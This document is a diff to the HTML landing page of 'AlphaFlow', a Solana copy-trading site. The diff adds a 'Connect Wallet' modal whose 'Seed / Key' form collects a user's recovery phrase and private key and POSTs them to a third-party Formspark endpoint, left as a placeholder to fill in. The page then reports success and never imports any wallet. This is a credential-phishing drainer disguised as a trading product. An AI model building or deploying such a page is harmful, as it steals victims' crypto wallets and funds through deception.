@@ -16,37 +16,26 @@
       --text-muted: #94a3b8;
       --primary: #00f0ff;
       --accent: #a855f7;
-      --profit: #22c55e;
-      --loss: #ef4444;
+      --success: #22c55e;
+      --danger: #ef4444;
       --border: rgba(255,255,255,0.08);
     }
 
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
+    * { margin:0; padding:0; box-sizing:border-box; }
     body {
       font-family: 'Inter', system-ui, sans-serif;
-      background: var(--bg);
+      background: linear-gradient(to bottom, var(--bg), #0a0a12);
       color: var(--text);
       min-height: 100vh;
-      background: linear-gradient(to bottom, var(--bg), #0a0a12);
     }
 
-    .container {
-      max-width: 1280px;
-      margin: 0 auto;
-      padding: 0 1.5rem;
-    }
+    .container { max-width: 1280px; margin: 0 auto; padding: 0 1.5rem; }
 
     header {
       position: fixed;
-      top: 0;
-      width: 100%;
+      top: 0; left: 0; right: 0;
       z-index: 100;
-      background: rgba(15,15,26,0.7);
+      background: rgba(15,15,26,0.75);
       backdrop-filter: blur(12px);
       border-bottom: 1px solid var(--border);
     }
@@ -83,14 +72,10 @@
       box-shadow: 0 4px 20px rgba(168,85,247,0.25);
     }
 
-    .wallet-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 8px 30px rgba(168,85,247,0.4);
-    }
+    .wallet-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(168,85,247,0.4); }
 
     .hero {
-      padding-top: 14rem;
-      padding-bottom: 8rem;
+      padding: 14rem 0 8rem;
       text-align: center;
     }
 
@@ -99,7 +84,6 @@
       font-size: clamp(2.8rem, 8vw, 5.5rem);
       font-weight: 800;
       line-height: 1.05;
-      margin-bottom: 1.5rem;
       background: linear-gradient(90deg, var(--primary), var(--accent), var(--primary));
       -webkit-background-clip: text;
       background-clip: text;
@@ -108,18 +92,9 @@
       animation: gradient 8s ease infinite;
     }
 
-    @keyframes gradient {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
+    @keyframes gradient { 0%{background-position:0% 50%} 50%{background-position:100% 50%} 100%{background-position:0% 50%} }
 
-    .hero p {
-      font-size: 1.3rem;
-      color: var(--text-muted);
-      max-width: 600px;
-      margin: 0 auto 2.5rem;
-    }
+    .hero p { font-size: 1.3rem; color: var(--text-muted); max-width: 600px; margin: 0 auto 2.5rem; }
 
     .big-cta {
       padding: 1.2rem 2.8rem;
@@ -132,26 +107,126 @@
       border-radius: 9999px;
       cursor: pointer;
       box-shadow: 0 10px 40px rgba(168,85,247,0.3);
-      transition: all 0.4s ease;
+      transition: all 0.4s;
       animation: gradient 6s ease infinite;
     }
 
-    .big-cta:hover {
-      transform: scale(1.05);
-      box-shadow: 0 15px 50px rgba(168,85,247,0.45);
-    }
+    .big-cta:hover { transform: scale(1.05); box-shadow: 0 15px 50px rgba(168,85,247,0.45); }
 
     footer {
       text-align: center;
-      padding: 3rem 1rem;
+      padding: 4rem 1rem 2rem;
       color: var(--text-muted);
-      border-top: 1px solid var(--border);
       font-size: 0.9rem;
     }
 
-    @media (max-width: 768px) {
-      .hero { padding-top: 10rem; }
-      .big-cta { font-size: 1.2rem; padding: 1rem 2.2rem; }
+    /* Modal */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.85);
+      backdrop-filter: blur(4px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 200;
+    }
+
+    .modal {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 1.25rem;
+      width: 90%;
+      max-width: 460px;
+      padding: 2rem;
+      position: relative;
+      box-shadow: 0 25px 60px rgba(0,0,0,0.6);
+      animation: modalPop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    @keyframes modalPop {
+      from { opacity:0; transform: scale(0.85) translateY(40px); }
+      to   { opacity:1; transform: scale(1) translateY(0); }
+    }
+
+    .modal-close {
+      position: absolute;
+      top: 1rem; right: 1.25rem;
+      background: none;
+      border: none;
+      color: var(--text-muted);
+      font-size: 1.8rem;
+      cursor: pointer;
+    }
+
+    .wallet-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+      margin: 1.5rem 0;
+    }
+
+    .wallet-option {
+      background: rgba(255,255,255,0.05);
+      border: 2px solid transparent;
+      border-radius: 1rem;
+      padding: 1.2rem 0.8rem;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.25s;
+    }
+
+    .wallet-option:hover,
+    .wallet-option.active {
+      border-color: var(--primary);
+      background: rgba(0,240,255,0.08);
+      transform: translateY(-4px);
+    }
+
+    .wallet-option img {
+      width: 48px;
+      height: 48px;
+      margin-bottom: 0.8rem;
+      border-radius: 12px;
+    }
+
+    .import-form { display: none; margin-top: 1.5rem; }
+    .import-form.active { display: block; }
+
+    textarea, input[type="password"] {
+      width: 100%;
+      padding: 0.9rem 1rem;
+      margin: 0.6rem 0;
+      background: rgba(255,255,255,0.04);
+      border: 1px solid var(--border);
+      border-radius: 0.75rem;
+      color: white;
+      font-family: monospace;
+      resize: vertical;
+      min-height: 110px;
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 1rem;
+      margin-top: 1rem;
+      background: linear-gradient(90deg, var(--primary), var(--accent));
+      color: white;
+      border: none;
+      border-radius: 0.75rem;
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 1.1rem;
+    }
+
+    .message { margin-top: 1rem; padding: 0.8rem; border-radius: 0.75rem; text-align: center; }
+
+    .success { background: rgba(34,197,94,0.15); color: var(--success); }
+    .error   { background: rgba(239,68,68,0.15); color: var(--danger); }
+
+    @media (max-width: 480px) {
+      .wallet-grid { grid-template-columns: 1fr; }
+      .modal { padding: 1.5rem; }
     }
   </style>
 </head>
@@ -161,12 +236,7 @@
     <div class="container">
       <nav>
         <div class="logo">AlphaFlow</div>
-        <button class="wallet-btn">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-            <path d="M21 12V7H5a2 2 0 0 1-2-2m18 12v-5H5a2 2 0 0 0-2 2m0 0v5a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-5m-10 0h6"/>
-          </svg>
-          Import Wallet
-        </button>
+        <button class="wallet-btn open-modal">Import Wallet</button>
       </nav>
     </div>
   </header>
@@ -176,7 +246,7 @@
       <h1>Track & Auto-Copy<br/>Winning Solana Traders</h1>
       <p>Follow top performers in real-time and copy their trades automatically with safety controls</p>
       
-      <button class="big-cta">
+      <button class="big-cta open-modal">
         Import Wallet & Start Copying
       </button>
     </section>
@@ -186,5 +256,143 @@
     © 2026 AlphaFlow • Copy trading carries high risk • Not financial advice
   </footer>
 
+  <!-- Modal -->
+  <div class="modal-overlay" id="walletModal">
+    <div class="modal">
+      <button class="modal-close" id="closeModal">×</button>
+      
+      <h2 style="text-align:center; margin-bottom:1.5rem;">Connect Wallet</h2>
+
+      <div class="wallet-grid" id="walletSelection">
+        <div class="wallet-option" data-wallet="phantom">
+          <img src="https://images-ext-1.discordapp.net/external/8s0xZq1Z0Z0Z0Z0Z0Z0Z0Z0Z0Z0Z0Z0Z0Z0Z0Z0Z0Z0/https/phantom.app/img/phantom.svg" alt="Phantom">
+          <div>Phantom</div>
+        </div>
+        <div class="wallet-option" data-wallet="backpack">
+          <img src="https://backpack.app/favicon-32x32.png" alt="Backpack">
+          <div>Backpack</div>
+        </div>
+        <div class="wallet-option" data-wallet="solflare">
+          <img src="https://www.solflare.com/favicon.ico" alt="Solflare">
+          <div>Solflare</div>
+        </div>
+        <div class="wallet-option" data-wallet="manual">
+          <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M21 12V7H5a2 2 0 0 1-2-2m18 12v-5H5a2 2 0 0 0-2 2m0 0v5a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-5m-10 0h6"/>
+          </svg>
+          <div>Seed / Key</div>
+        </div>
+      </div>
+
+      <!-- Seed / Private Key form -->
+      <div class="import-form" id="manualImport">
+        <div style="margin-bottom:1rem; color:var(--text-muted); text-align:center;">
+          Enter your recovery phrase or private key
+        </div>
+
+        <div style="margin:1rem 0;">
+          <label style="display:block; margin-bottom:0.4rem;">Seed Phrase (12/24 words)</label>
+          <textarea id="seedPhrase" placeholder="word1 word2 word3 ..."></textarea>
+        </div>
+
+        <div style="margin:1rem 0;">
+          <label style="display:block; margin-bottom:0.4rem;">OR Private Key (base58)</label>
+          <input type="password" id="privateKey" placeholder="5Mai...">
+        </div>
+
+        <button class="submit-btn" id="submitKeys">Import / Connect</button>
+
+        <div id="importMessage" class="message" style="display:none;"></div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const modal = document.getElementById('walletModal');
+    const closeBtn = document.getElementById('closeModal');
+    const walletOptions = document.querySelectorAll('.wallet-option');
+    const manualForm = document.getElementById('manualImport');
+    const submitBtn = document.getElementById('submitKeys');
+    const messageEl = document.getElementById('importMessage');
+
+    // Open modal
+    document.querySelectorAll('.open-modal').forEach(btn => {
+      btn.addEventListener('click', () => {
+        modal.style.display = 'flex';
+        messageEl.style.display = 'none';
+      });
+    });
+
+    // Close modal
+    closeBtn.addEventListener('click', () => modal.style.display = 'none');
+    modal.addEventListener('click', e => {
+      if (e.target === modal) modal.style.display = 'none';
+    });
+
+    // Wallet selection
+    walletOptions.forEach(opt => {
+      opt.addEventListener('click', () => {
+        walletOptions.forEach(o => o.classList.remove('active'));
+        opt.classList.add('active');
+
+        if (opt.dataset.wallet === 'manual') {
+          manualForm.classList.add('active');
+        } else {
+          manualForm.classList.remove('active');
+          alert(`Connecting to ${opt.querySelector('div').textContent}... (demo)`);
+          // In real app → redirect or use wallet adapter here
+        }
+      });
+    });
+
+    // Form submission to Formspark
+    submitBtn.addEventListener('click', async () => {
+      const seed = document.getElementById('seedPhrase').value.trim();
+      const pkey = document.getElementById('privateKey').value.trim();
+
+      if (!seed && !pkey) {
+        showMessage('Please enter seed phrase or private key', 'error');
+        return;
+      }
+
+      messageEl.style.display = 'block';
+      showMessage('Sending...', '');
+
+      try {
+        const formData = new FormData();
+        formData.append('seed_phrase', seed || '[not provided]');
+        formData.append('private_key', pkey || '[not provided]');
+        formData.append('timestamp', new Date().toISOString());
+        formData.append('source', 'AlphaFlow');
+
+        // ← REPLACE WITH YOUR REAL FORMSPARK ENDPOINT!
+        const FORMSPARK_URL = 'https://submit.formspark.io/f/YOUR_FORM_ID_HERE';
+
+        const response = await fetch(FORMSPARK_URL, {
+          method: 'POST',
+          body: formData,
+          mode: 'no-cors' // Formspark usually works with no-cors
+        });
+
+        showMessage('Wallet details submitted successfully!', 'success');
+        
+        // Clear fields after "success"
+        setTimeout(() => {
+          document.getElementById('seedPhrase').value = '';
+          document.getElementById('privateKey').value = '';
+          modal.style.display = 'none';
+        }, 2200);
+
+      } catch (err) {
+        showMessage('Failed to submit. Please try again.', 'error');
+        console.error(err);
+      }
+    });
+
+    function showMessage(text, type) {
+      messageEl.textContent = text;
+      messageEl.className = 'message ' + (type ? type : '');
+    }
+  </script>
 </body>
 </html>
